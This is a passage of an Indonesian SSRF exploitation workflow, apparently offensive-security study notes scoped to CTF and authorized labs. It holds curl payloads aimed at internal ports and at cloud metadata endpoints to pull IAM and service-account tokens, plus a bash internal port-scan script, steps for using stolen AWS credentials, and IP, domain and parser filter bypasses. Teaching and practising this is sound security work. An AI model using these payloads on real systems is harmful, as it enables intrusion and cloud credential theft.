---
id: "22"
title: "🌐 22 — SSRF Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "22_ssrf_workflow.md"
refs_out: ["05","06","11","14a","14c","14d","21","23","35","42","60"]
refs_in: ["15","20","21","23","27","28","30","31"]
---

← [File 21: XXE](/docs/xxe)

# 🌐 22 — SSRF Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, Proving Grounds, dan lab yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Goal:** membangun _muscle memory_ SSRF dari menemukan URL sink → membuktikan server-side fetch → pivot ke localhost/internal service → cloud metadata → bypass filtering → chaining.

---

# 📚 Daftar Isi

- [🌐 0. SSRF Fundamentals](#-0-ssrf-fundamentals)
    
    - [0.1 Apa Itu SSRF](#01-apa-itu-ssrf)
        
    - [0.2 Kenapa SSRF Berbahaya](#02-kenapa-ssrf-berbahaya)
        
    - [0.3 Cara Identify SSRF](#03-cara-identify-ssrf)
        
    - [0.4 SSRF Attack Surface](#04-ssrf-attack-surface)
        
- [🔬 1. Basic SSRF](#-1-basic-ssrf)
    
    - [1.1 Deteksi SSRF Awal](#11-deteksi-ssrf-awal)
        
    - [1.2 SSRF ke Localhost](#12-ssrf-ke-localhost)
        
    - [1.3 SSRF Internal Port Scanning](#13-ssrf-internal-port-scanning)
        
    - [1.4 SSRF ke Internal Services](#14-ssrf-ke-internal-services)
        
- [☁️ 2. Cloud Metadata SSRF](#-2-cloud-metadata-ssrf)
    
    - [2.1 AWS IMDSv1 vs IMDSv2](#21-aws-imdsv1-vs-imdsv2)
        
    - [2.2 AWS Metadata Endpoints](#22-aws-metadata-endpoints)
        
    - [2.3 GCP Metadata](#23-gcp-metadata)
        
    - [2.4 Azure Metadata](#24-azure-metadata)
        
    - [2.5 Cara Pakai Stolen Credentials](#25-cara-pakai-stolen-credentials)
        
- [🧩 3. SSRF Filter Bypass](#-3-ssrf-filter-bypass)
    
    - [3.1 IP Address Bypass](#31-ip-address-bypass)
        
    - [3.2 Domain Bypass](#32-domain-bypass)
        
    - [3.3 URL Parser Bypass](#33-url-parser-bypass)
        
    - [3.4 Protocol Bypass](#34-protocol-bypass)
        
    - [3.5 Redirect Bypass](#35-redirect-bypass)
        
    - [3.6 DNS Rebinding](#36-dns-rebinding-konsep)
        
- [🚀 4. SSRF Advanced Techniques](#-4-ssrf-advanced-techniques)
    
    - [4.1 Gopher Protocol](#41-gopher-protocol-untuk-ssrf)
        
    - [4.2 SSRF ke Redis via Gopher](#42-ssrf-ke-redis-via-gopher)
        
    - [4.3 SSRF ke Internal API](#43-ssrf-ke-internal-api)
        
    - [4.4 Blind SSRF](#44-blind-ssrf)
        
    - [4.5 Semi-Blind SSRF](#45-semi-blind-ssrf)
        
- [📦 5. SSRF di Berbagai Konteks](#-5-ssrf-di-berbagai-konteks)
    
    - [5.1 PDF Generator](#51-ssrf-via-pdf-generator)
        
    - [5.2 Image Fetcher](#52-ssrf-via-image-fetcher)
        
    - [5.3 Webhook](#53-ssrf-via-webhook)
        
    - [5.4 URL Preview](#54-ssrf-via-url-preview--link-unfurling)
        
    - [5.5 File Import](#55-ssrf-via-file-import)
        
    - [5.6 Header Injection](#56-ssrf-via-header-injection)
        
- [💥 6. SSRF to RCE](#-6-ssrf-to-rce)
    
    - [6.1 SSRF → Redis → RCE](#61-ssrf--redis--rce)
        
    - [6.2 SSRF → Internal Admin → RCE](#62-ssrf--internal-admin--rce)
        
    - [6.3 SSRF → Cloud Metadata → RCE](#63-ssrf--cloud-metadata--rce)
        
    - [6.4 SSRF → Internal CI/CD → RCE](#64-ssrf--internal-cicd--rce)
        
- [🧰 7. Tools & Automation](#-7-tools--automation)
    
    - [7.1 Interactsh](#71-interactsh-untuk-ssrf-detection)
        
    - [7.2 SSRFmap](#72-ssrfmap)
        
    - [7.3 Gopherus](#73-gopherus)
        
    - [7.4 ssrf_test.sh](#74-script-ssrf_testsh)
        
    - [7.5 ssrf_port_scan.sh](#75-script-ssrf_port_scansh)
        
- [🌳 8. Decision Tree](#-8-decision-tree)
    
- [🛠️ 9. Common Errors & Troubleshooting](#-9-common-errors--troubleshooting)
    

---

# 🌐 0. SSRF Fundamentals

# 0.1 Apa Itu SSRF

## 📌 Kapan Digunakan

Curigai SSRF saat aplikasi menerima URL atau resource location dari user lalu **server** melakukan request ke URL tersebut.

Contoh feature:

```text
URL preview
Webhook
Import from URL
Image fetcher
PDF generator
URL screenshot
Remote file loader
Callback verifier
```

---

## Analogi Sederhana

Tanpa SSRF:

```text
Browser
   │
   └──→ Public Website
```

Dengan SSRF:

```text
Attacker
   │
   │ "Fetch URL ini"
   ▼
Target Server
   │
   ├──→ Public Internet
   │
   └──→ Internal Network
```

Attacker tidak melakukan request langsung ke internal service.

Target server yang melakukannya.

---

## Normal Request vs SSRF

### Normal

```text
User
 │
 ▼
Server
 │
 ▼
Expected External Resource
 │
 ▼
Response
```

### SSRF

```text
User
 │
 │ URL = http://127.0.0.1:8080
 ▼
Target Server
 │
 ▼
127.0.0.1:8080
 │
 ▼
Internal Service
 │
 ▼
Response
```

---

## SSRF vs Open Redirect

Ini sering tertukar.

### Open Redirect

```text
Attacker
   │
   ▼
Target Website
   │
   ▼
HTTP 302
   │
   ▼
External Attacker Website
```

Server hanya mengarahkan browser.

### SSRF

```text
Attacker
   │
   ▼
Target Server
   │
   ▼
Internal Resource
```

Server sendiri melakukan fetch.

---

## Proof of Difference

Open redirect:

```http
HTTP/1.1 302 Found
Location: https://attacker.example/
```

SSRF:

```http
HTTP/1.1 200 OK

Internal Admin Dashboard
```

---

# 0.2 Kenapa SSRF Berbahaya

## 📌 Kapan Digunakan

Setelah server-side fetch terbukti, cari tahu **apa yang bisa dicapai dari network position server**.

SSRF dapat memberikan akses ke:

```text
SSRF
 │
 ├── localhost
 ├── internal services
 ├── admin interfaces
 ├── cloud metadata
 ├── private APIs
 ├── databases/protocols
 └── management interfaces
```

---

## Attack Surface

```text
                  SSRF
                   │
       ┌───────────┼────────────┐
       ▼           ▼            ▼
   Localhost    Internal     Cloud
       │         Network     Metadata
       │           │            │
       ▼           ▼            ▼
    Admin       APIs         IAM
    Panels      Jenkins      Tokens
    Redis       Docker       Secrets
    ES          K8s
       │           │            │
       └───────────┼────────────┘
                   ▼
                Pivot
                   │
                   ▼
            Potential RCE
```

---

## Cloud Metadata Risk

Contoh:

```text
Application
   │
   ▼
169.254.169.254
   │
   ▼
Instance Metadata
   │
   ▼
Temporary Credentials
   │
   ▼
Cloud API
```

Credential exposure dapat menjadi sangat serius karena privilege IAM menentukan impact.

---

# 0.3 Cara Identify SSRF

## 📌 Kapan Digunakan

Cari input seperti:

```text
url=
uri=
path=
dest=
destination=
redirect=
next=
src=
source=
image=
fetch=
load=
proxy=
callback=
webhook=
link=
target=
host=
domain=
feed=
import=
```

---

## Parameter URL

Contoh:

```http
POST /fetch HTTP/1.1

url=https://example.com
```

Kandidat kuat.

---

## Feature yang Fetch Resource

### URL Preview

```text
Paste URL
    │
    ▼
Preview
    │
    └── Server fetches website
```

### Image Fetcher

```text
image_url=https://example.com/image.jpg
```

### Webhook

```text
webhook_url=https://listener.example/
```

### PDF Generator

```text
url=https://example.com/report
```

### Import from URL

```text
feed=https://example.com/feed.xml
```

### Screenshot Service

```text
target=https://example.com
```

---

## Header Injection Points

Cari aplikasi yang menggunakan header dalam backend fetch logic:

```text
Host
X-Forwarded-Host
X-Forwarded-For
Referer
Origin
```

Header sendiri tidak otomatis berarti SSRF.

Yang dicari adalah:

```text
attacker-controlled value
       ↓
server-side URL/request construction
       ↓
outbound request
```

---

## DNS Rebinding Surface

Curigai bila aplikasi:

```text
1. validate hostname
2. resolve DNS
3. kemudian request URL
```

dalam dua langkah terpisah.

---

# 0.4 SSRF Attack Surface

| Parameter Name | Common Location    | SSRF Risk      |
| -------------- | ------------------ | -------------- |
| `url`          | API/query/body     | 🔴 High        |
| `uri`          | API/body           | 🔴 High        |
| `dest`         | redirect/fetch     | 🔴 High        |
| `destination`  | proxy/import       | 🔴 High        |
| `path`         | file/import API    | 🟠 Medium–High |
| `src`          | image/resource     | 🔴 High        |
| `source`       | import endpoint    | 🔴 High        |
| `href`         | link/import        | 🟠 Medium–High |
| `proxy`        | proxy service      | 🔴 High        |
| `callback`     | callback service   | 🟠 Medium      |
| `return`       | redirect           | 🟠 Medium      |
| `next`         | redirect           | 🟠 Medium      |
| `redirect`     | redirect endpoint  | 🟠 Medium      |
| `redirect_uri` | OAuth/proxy        | 🟠 Medium–High |
| `image`        | image fetcher      | 🔴 High        |
| `image_url`    | avatar/import      | 🔴 High        |
| `fetch`        | resource fetch     | 🔴 High        |
| `load`         | resource loader    | 🔴 High        |
| `remote`       | remote file        | 🔴 High        |
| `remote_url`   | remote import      | 🔴 High        |
| `target`       | screenshot/scanner | 🔴 High        |
| `link`         | preview            | 🔴 High        |
| `feed`         | RSS/XML importer   | 🔴 High        |
| `webhook`      | webhook config     | 🔴 High        |
| `webhook_url`  | webhook config     | 🔴 High        |
| `host`         | proxy/fetch logic  | 🟠 Medium–High |
| `domain`       | network checker    | 🟠 Medium      |
| `endpoint`     | service proxy      | 🔴 High        |
| `api_url`      | API integration    | 🔴 High        |
| `import_url`   | import feature     | 🔴 High        |

> Prioritas tertinggi adalah parameter yang memang menghasilkan **server-side outbound request**.

---

# 🔬 1. Basic SSRF

# 1.1 Deteksi SSRF Awal

## 📌 Kapan Digunakan

Gunakan segera setelah menemukan endpoint yang menerima URL.

Cara paling bersih adalah memakai domain yang Anda kontrol atau callback service.

Contoh:

```text
https://ATTACKER.example/ssrf-test
```

---

## Basic Test

```bash
curl -i -X POST \
http://TARGET/fetch \
-d 'url=https://ATTACKER.example/ssrf-test'
```

Expected pada vulnerable application:

```http
HTTP/1.1 200 OK

Fetched:
SSRF_TEST
```

Tetapi response bisa saja tidak berisi body.

---

## OOB Test

Dengan callback infrastructure:

```text
https://YOUR-CALLBACK-ID.example/
```

Request:

```bash
curl -i -X POST \
http://TARGET/fetch \
-d 'url=https://YOUR-CALLBACK-ID.example/'
```

Jika callback diterima:

```text
DNS/HTTP callback
      │
      ▼
Target server IP
```

maka server-side fetch terbukti.

---

## Apa yang Dicari?

```text
HTTP status
response body
response length
redirect behavior
DNS callback
HTTP callback
timing
server error
```

---

## SSRF vs Normal Fetch

Normal:

```text
url=https://example.com
```

Response:

```text
Example Domain
```

SSRF:

```text
url=http://127.0.0.1:8080/
```

Response:

```text
Internal Admin
```

Kandidat SSRF menjadi sangat kuat.

---

# 1.2 SSRF ke Localhost

## 📌 Kapan Digunakan

Setelah server-side fetch terbukti, test apakah filter mengizinkan loopback.

---

## `127.0.0.1`

```bash
curl -i -X POST \
http://TARGET/fetch \
--data-urlencode 'url=http://127.0.0.1/'
```

Expected:

```text
HTTP/1.1 200 OK

Apache2 Ubuntu Default Page
```

atau:

```text
Connection refused
```

---

## `localhost`

```bash
curl -i -X POST \
http://TARGET/fetch \
--data-urlencode 'url=http://localhost/'
```

---

## IPv6

```bash
curl -i -X POST \
http://TARGET/fetch \
--data-urlencode 'url=http://[::1]/'
```

---

## Common Ports

Mulai dari service yang sering muncul:

```text
80
443
3000
5000
8000
8080
8443
9000
9200
10250
2375
```

Contoh:

```bash
curl -i -X POST \
http://TARGET/fetch \
--data-urlencode \
'url=http://127.0.0.1:8080/'
```

---

## Expected Response

### Open

```text
HTTP/1.1 200 OK

Jenkins
```

### Closed

```text
HTTP/1.1 502 Bad Gateway

Connection refused
```

### Filtered

```text
HTTP/1.1 504 Gateway Timeout
```

Jangan menyamakan ketiganya.

---

## Localhost Flow

```text
SSRF
 │
 ▼
http://127.0.0.1:PORT
 │
 ├── 200 → service may exist
 ├── 30x → service may exist + redirect
 ├── 401 → service likely exists
 ├── 403 → service likely exists
 ├── refused → likely closed
 └── timeout → filtered/unreachable/slow
```

---

# 1.3 SSRF Internal Port Scanning

## 📌 Kapan Digunakan

Saat SSRF sudah terbukti dan endpoint memperlihatkan **response/timing/error difference** berdasarkan destination port.

---

## Prinsip

Test:

```text
127.0.0.1:PORT
```

kemudian compare:

```text
status
size
time
error string
```

---

## Baseline

```bash
curl -sS -o /dev/null \
-w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' \
--get \
--data-urlencode 'url=http://127.0.0.1:80/' \
http://TARGET/fetch
```

Port lain:

```bash
curl -sS -o /dev/null \
-w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' \
--get \
--data-urlencode 'url=http://127.0.0.1:8080/' \
http://TARGET/fetch
```

---

## Priority Port List

```text
22     SSH
21     FTP
25     SMTP
53     DNS
80     HTTP
443    HTTPS
3000   Node/Grafana/dev apps
3306   MySQL
5000   Flask/dev apps
5432   PostgreSQL
6379   Redis
8000   Python/dev apps
8080   Jenkins/proxy/apps
8443   HTTPS management
9000   PHP-FPM/dev apps
9200   Elasticsearch
10250  kubelet
2375   Docker
```

---

## Script `ssrf_port_scan.sh`

Script ini mengasumsikan:

```text
GET /fetch?url=DESTINATION
```

dan menggunakan HTTP status + body size + timing sebagai heuristic.

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage:"
    echo "$0 <ssrf_url> <parameter> <start_port> <end_port>"
    echo
    echo "Example:"
    echo "$0 'http://TARGET/fetch' url 1 1000"
    exit 1
}

[[ $# -eq 4 ]] || usage

BASE_URL="$1"
PARAM="$2"
START_PORT="$3"
END_PORT="$4"

if [[ ! "$BASE_URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] ssrf_url must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$BASE_URL" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] URL contains whitespace${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

if [[ ! "$START_PORT" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[!] Start port must be numeric${NC}"
    exit 1
fi

if [[ ! "$END_PORT" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[!] End port must be numeric${NC}"
    exit 1
fi

if (( START_PORT < 1 || START_PORT > 65535 )); then
    echo -e "${RED}[!] Start port must be 1-65535${NC}"
    exit 1
fi

if (( END_PORT < 1 || END_PORT > 65535 )); then
    echo -e "${RED}[!] End port must be 1-65535${NC}"
    exit 1
fi

if (( START_PORT > END_PORT )); then
    echo -e "${RED}[!] Start port cannot exceed end port${NC}"
    exit 1
fi

RANGE=$((END_PORT - START_PORT + 1))

if (( RANGE > 1000 )); then
    echo -e "${YELLOW}[!] Maximum range for this script is 1000 ports${NC}"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required${NC}"
    exit 1
fi

echo -e "${BLUE}[*] SSRF endpoint : $BASE_URL${NC}"
echo -e "${BLUE}[*] Parameter     : $PARAM${NC}"
echo -e "${BLUE}[*] Target        : 127.0.0.1${NC}"
echo -e "${BLUE}[*] Range         : $START_PORT-$END_PORT${NC}"

echo
echo -e "${YELLOW}Port   Code   Size   Time(s)   Classification${NC}"

for ((port=START_PORT; port<=END_PORT; port++)); do

    RESULT="$(
        curl -ksS \
        --max-time 5 \
        -o /dev/null \
        -w '%{http_code} %{size_download} %{time_total}' \
        --get \
        --data-urlencode \
        "${PARAM}=http://127.0.0.1:${port}/" \
        "$BASE_URL" \
        2>/dev/null || echo "000 0 5"
    )"

    read -r CODE SIZE TIME <<< "$RESULT"

    CLASS="filtered/unknown"

    case "$CODE" in
        200|201|202|204|301|302|307|308|401|403|404)
            CLASS="OPEN/CANDIDATE"
            ;;
        502)
            CLASS="REFUSED/PROXY"
            ;;
        503|504)
            CLASS="TIMEOUT/UNREACHABLE"
            ;;
        000)
            CLASS="REQUEST ERROR"
            ;;
    esac

    if [[ "$CLASS" == "OPEN/CANDIDATE" ]]; then
        echo -e "${GREEN}$(printf '%-6s %-6s %-6s %-9s %s' \
            "$port" "$CODE" "$SIZE" "$TIME" "$CLASS")${NC}"
    else
        printf '%-6s %-6s %-6s %-9s %s\n' \
            "$port" "$CODE" "$SIZE" "$TIME" "$CLASS"
    fi

done

echo
echo -e "${YELLOW}[*] Important:${NC}"
echo "HTTP response differences are heuristic."
echo "Note: Status 200 bisa berarti proxy/WAF mengembalikan error page dengan status 200 OK."
echo "Selalu inspect response body atau bandingkan response size untuk memvalidasi port terbuka!"
echo "Validate interesting ports manually."
```

Jalankan:

```bash
chmod +x ssrf_port_scan.sh

./ssrf_port_scan.sh \
'http://TARGET/fetch' \
url \
8000 \
9000
```

Contoh output:

```text
Port   Code   Size   Time(s)   Classification
8000   502    0      0.041     REFUSED/PROXY
8001   200    4312   0.083     OPEN/CANDIDATE
8002   502    0      0.039     REFUSED/PROXY
8080   200    12543  0.091     OPEN/CANDIDATE
8443   502    0      0.044     REFUSED/PROXY
```

Analisis:

```text
8001 → candidate
8080 → candidate
```

Kemudian:

```bash
curl -s \
--get \
--data-urlencode 'url=http://127.0.0.1:8080/' \
http://TARGET/fetch
```

---

# 1.4 SSRF ke Internal Services

## 📌 Kapan Digunakan

Setelah localhost access terbukti.

---

## Admin Panel

```bash
curl -i -G \
--data-urlencode 'url=http://127.0.0.1:8080/' \
http://TARGET/fetch
```

Possible:

```text
Jenkins
Tomcat
Spring Boot Actuator
Admin Dashboard
```

---

## Redis

```bash
curl -i -G \
--data-urlencode 'url=http://127.0.0.1:6379/' \
http://TARGET/fetch
```

Kemungkinan:

```text
wrong version number
bad request
connection accepted
```

Untuk Redis, HTTP fetcher mungkin tidak bisa berbicara Redis protocol. Itu alasan `gopher://` menjadi penting.

---

## MySQL

```text
127.0.0.1:3306
```

Tetapi HTTP fetcher:

```text
HTTP client → MySQL protocol
```

tidak compatible.

Hasil error tetap dapat menjadi service fingerprint.

---

## Elasticsearch

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:9200/' \
http://TARGET/fetch
```

Expected:

```json
{
  "name": "node01",
  "cluster_name": "elasticsearch"
}
```

---

## Kubernetes

Potential endpoints:

```text
127.0.0.1:8001
127.0.0.1:10250
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:8001/' \
http://TARGET/fetch
```

---

## Docker Daemon

Potential legacy/unsecured HTTP API:

```text
127.0.0.1:2375
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:2375/version' \
http://TARGET/fetch
```

Expected vulnerable environment:

```json
{
  "Version": "..."
}
```

---

## Jenkins

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:8080/login' \
http://TARGET/fetch
```

Expected:

```text
Jenkins
Sign in
```

---

# ☁️ 2. Cloud Metadata SSRF

# 2.1 AWS IMDSv1 vs IMDSv2

## 📌 Kapan Digunakan

Saat SSRF target adalah AWS EC2/compatible environment dan Anda perlu menentukan metadata interaction model.

---

## IMDSv1

Flow:

```text
HTTP GET
   │
   ▼
169.254.169.254
   │
   ▼
metadata
```

Tidak membutuhkan session token.

---

## IMDSv2

Flow:

```text
PUT request
   │
   ▼
IMDS token
   │
   ▼
GET metadata
   │
   ▼
Metadata
```

Token request:

```http
PUT /latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

---

## Kenapa IMDSv2 Lebih Aman?

IMDSv2 menambahkan session-oriented token requirement yang membantu mengurangi sejumlah SSRF abuse patterns.

Tetapi:

```text
IMDSv2
≠
SSRF impossible
```

Kemampuan exploitation bergantung pada SSRF primitive dan apakah request method/header tertentu dapat dikontrol.

---

## Detect Basic Metadata

```bash
curl -i \
http://169.254.169.254/latest/meta-data/
```

Expected pada environment dengan akses:

```text
ami-id
hostname
instance-id
iam/
```

---

# 2.2 AWS Metadata Endpoints

> Pada **IMDSv1**, endpoint berikut dapat diakses secara langsung bila network path memungkinkan. Untuk SSRF, kemampuan aplikasi untuk menentukan method/header sangat penting.

## Base Metadata

```bash
curl -i \
http://169.254.169.254/latest/meta-data/
```

Expected:

```text
ami-id
instance-id
hostname
iam/
network/
```

---

## IAM Security Credentials

```bash
curl -i \
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Expected:

```text
webapp-role
```

---

## Role Credentials

Misalnya role:

```text
webapp-role
```

Request:

```bash
curl -i \
http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role
```

Expected bentuk response:

```json
{
  "AccessKeyId": "ASIAXXXXXXXXX",
  "SecretAccessKey": "REDACTED",
  "Token": "REDACTED",
  "Expiration": "..."
}
```

Dalam CTF, nilai tersebut dapat menjadi credential sementara.

---

## User Data

```bash
curl -i \
http://169.254.169.254/latest/user-data/
```

Potential:

```text
#!/bin/bash
export APP_ENV=...
```

---

## Hostname

```bash
curl -i \
http://169.254.169.254/latest/meta-data/hostname
```

Expected:

```text
ip-10-0-1-25
```

---

## Public IPv4

```bash
curl -i \
http://169.254.169.254/latest/meta-data/public-ipv4
```

Expected:

```text
203.0.113.10
```

---

## Instance Identity Document

```bash
curl -i \
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Expected structure:

```json
{
  "instanceId": "i-...",
  "region": "us-east-1",
  "availabilityZone": "us-east-1a",
  "accountId": "..."
}
```

---

## SSRF URL Variants

Jika aplikasi menerima `url`:

```bash
curl -G \
--data-urlencode \
'url=http://169.254.169.254/latest/meta-data/' \
http://TARGET/fetch
```

IAM:

```bash
curl -G \
--data-urlencode \
'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
http://TARGET/fetch
```

---

## IMDSv2 Through SSRF

Problem utama:

```text
PUT + custom header
```

dapat tidak bisa dilakukan oleh simple URL fetcher.

Kalau SSRF hanya mendukung:

```text
GET URL
```

maka:

```text
IMDSv2
```

sering menjadi barrier.

Jika application primitive memungkinkan method/header control, lab dapat menguji:

```http
PUT /latest/api/token
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Response:

```text
TOKEN_VALUE
```

Kemudian:

```http
GET /latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_VALUE
```

---

# 2.3 GCP Metadata

## 📌 Kapan Digunakan

Saat target berada pada GCP environment.

---

## Base

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://metadata.google.internal/
```

Alternative IP:

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://169.254.169.254/
```

---

## Compute Metadata

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://metadata.google.internal/computeMetadata/v1/
```

---

## Project Information

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Expected:

```text
example-project
```

---

## Service Account

List:

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

---

## Token

Misalnya service account:

```text
default/
```

Request:

```bash
curl -i \
-H 'Metadata-Flavor: Google' \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Expected:

```json
{
  "access_token": "...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

---

## Through SSRF

Jika SSRF bisa mengontrol header:

```text
Metadata-Flavor: Google
```

maka request dapat diarahkan ke:

```text
http://metadata.google.internal/computeMetadata/v1/
```

Jika fetcher tidak memberikan header control, metadata request dapat gagal karena requirement tersebut.

---

# 2.4 Azure Metadata

## 📌 Kapan Digunakan

Saat target berada pada Azure VM/managed identity environment.

---

## Instance Metadata

```bash
curl -i \
-H 'Metadata: true' \
'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
```

Expected:

```json
{
  "compute": {
    "name": "...",
    "location": "...",
    "vmId": "..."
  }
}
```

---

## Managed Identity Token

Contoh endpoint:

```bash
curl -i \
-H 'Metadata: true' \
'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
```

Expected:

```json
{
  "access_token": "...",
  "expires_on": "...",
  "token_type": "Bearer"
}
```

---

## SSRF Requirement

Azure metadata biasanya membutuhkan:

```text
Metadata: true
```

Jika SSRF tidak dapat mengirim arbitrary headers:

```text
GET-only SSRF
     │
     ▼
Azure metadata request
     │
     ▼
Header missing
     │
     ▼
Request rejected
```

---

# 2.5 Cara Pakai Stolen Credentials

> Hanya gunakan credential yang memang diperoleh dari lab/CTF.

---

## AWS Credential File

Buat directory:

```bash
mkdir -p ~/.aws
chmod 700 ~/.aws
```

File:

```bash
nano ~/.aws/credentials
```

Format:

```ini
[default]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
aws_session_token = ...
```

Permissions:

```bash
chmod 600 ~/.aws/credentials
```

---

## Verify Identity

```bash
aws sts get-caller-identity
```

Expected:

```json
{
    "UserId": "...",
    "Account": "...",
    "Arn": "arn:aws:iam::123456789012:role/webapp-role"
}
```

---

## Basic Enumeration

```bash
aws iam get-user
```

Jika permission memungkinkan:

```bash
aws iam list-attached-user-policies \
--user-name USER
```

Untuk role:

```bash
aws iam list-attached-role-policies \
--role-name ROLE_NAME
```

---

## Regional Resource Check

```bash
aws ec2 describe-instances \
--region us-east-1
```

Credential possession tidak sama dengan unlimited cloud access.

Selalu cek:

```text
identity
permissions
resource scope
region
```

---

# 🧩 3. SSRF Filter Bypass

# 3.1 IP Address Bypass

## 📌 Kapan Digunakan

Saat aplikasi memblokir string:

```text
127.0.0.1
localhost
```

tetapi validator memiliki perbedaan parsing/normalization.

---

## 127.0.0.1 Representations

|Representation|Example|Catatan|
|---|---|---|
|Standard IPv4|`127.0.0.1`|baseline|
|Decimal integer|`2130706433`|parser tertentu|
|Octal first octet|`0177.0.0.1`|parser-dependent|
|Hex integer|`0x7f000001`|parser-dependent|
|IPv6 loopback|`::1`|IPv6|
|IPv4-mapped IPv6|`::ffff:127.0.0.1`|parser-dependent|
|Short form|`127.1`|legacy/parser-dependent|
|Mixed notation|`127.0.1`|parser-dependent|
|Hex octets|`0x7f.0x0.0x0.0x1`|parser-dependent|
|Decimal dotted|`127.0.0.1`|baseline|
|Zero-padded|`127.000.000.001`|parser-dependent|
|Trailing dot|`127.0.0.1.`|resolver/parser-dependent|
|IPv6 full loopback|`0:0:0:0:0:0:0:1`|IPv6|
|IPv4 mapped hex|`::ffff:7f00:1`|parser-dependent|

---

## Decimal

```text
127 × 256³ +
0 × 256² +
0 × 256 +
1
=
2130706433
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://2130706433/' \
http://TARGET/fetch
```

---

## Hex

```text
0x7f000001
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://0x7f000001/' \
http://TARGET/fetch
```

---

## IPv6

```bash
curl -G \
--data-urlencode \
'url=http://[::1]/' \
http://TARGET/fetch
```

---

## Important

Representation bypass hanya bekerja jika:

```text
validator parser
     ≠
request URL parser
```

Artinya validator mungkin mengatakan:

```text
"not localhost"
```

sedangkan HTTP client/server resolver:

```text
"this resolves to 127.0.0.1"
```

---

# 3.2 Domain Bypass

## 📌 Kapan Digunakan

Ketika aplikasi memblokir IP literal tetapi tetap menerima hostname.

---

## Localhost

```text
localhost
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://localhost/' \
http://TARGET/fetch
```

---

## Owned Domain Resolving to Loopback

Pada lab, Anda bisa menggunakan domain yang memang Anda kontrol dan mengarahkannya ke:

```text
127.0.0.1
```

Contoh konsep:

```text
internal-lab.example
        │
        ▼
    DNS = 127.0.0.1
```

---

## `nip.io` & `sslip.io`

Pattern Wildcard DNS:

```text
127.0.0.1.nip.io
127.0.0.1.sslip.io
```

DNS service publik seperti `nip.io` dan `sslip.io` secara otomatis memetakan subdomain IP kembali ke alamat IP tersebut untuk mem-bypass validasi hostname.

Test:

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1.nip.io/' \
http://TARGET/fetch
```

> ⚠️ **Catatan Ketersediaan & Caveat di Lingkungan Lab/CTF:**
> Layanan pihak ketiga seperti `nip.io`, `sslip.io`, atau `xip.io` memiliki ketersediaan yang tidak selalu konsisten:
> - Banyak environment lab/CTF terisolasi atau firewall memblokir resolusi DNS publik ini.
> - Layanan publik sewaktu-waktu dapat mengalami downtime.
>
> **Alternatif yang Lebih Andal:**
> 1. **Domain Milik Sendiri:** Konfigurasikan A record pada domain Anda yang mengarah langsung ke `127.0.0.1` (misal: `local.yourdomain.com`).
> 2. **Lab Offline / Local Testing:** Manipulasi file `/etc/hosts` atau resolver DNS lokal.
> 3. **sslip.io:** Gunakan `sslip.io` sebagai alternatif langsung jika `nip.io` diblokir.

---

# 3.3 URL Parser Bypass

## 📌 Kapan Digunakan

Saat application validation dan actual URL parser kemungkinan memiliki interpretation mismatch.

---

## Credentials Syntax

```text
http://attacker@127.0.0.1/
```

URL parser:

```text
username = attacker
host = 127.0.0.1
```

Test:

```bash
curl -G \
--data-urlencode \
'url=http://attacker@127.0.0.1/' \
http://TARGET/fetch
```

---

## Double Slash / Triple Slash

```text
http:///127.0.0.1/
```

Parser behavior sangat implementation-specific.

---

## Backslash

```text
http:\\127.0.0.1\
```

Lebih relevan terhadap parser tertentu yang melakukan Windows-style normalization.

---

## Fragment

```text
http://127.0.0.1#attacker.com
```

> ⚠️ **Konteks Bypass Menggunakan Karakter Fragment (`#`):**
> Secara spesifikasi HTTP, karakter fragment (`#`) dan string setelahnya diproses di sisi client dan **tidak pernah dikirimkan** ke server tujuan.
>
> **Bagaimana `#` Menjadi Vektor Bypass?**
> - Karakter `#` berguna **BUKAN** untuk mengubah alamat tujuan jaringan (karena HTTP client tetap akan melakukan koneksi ke `127.0.0.1`).
> - Sebaliknya, `#` berguna untuk **mengelabui validator naive berbasis string/regex**!
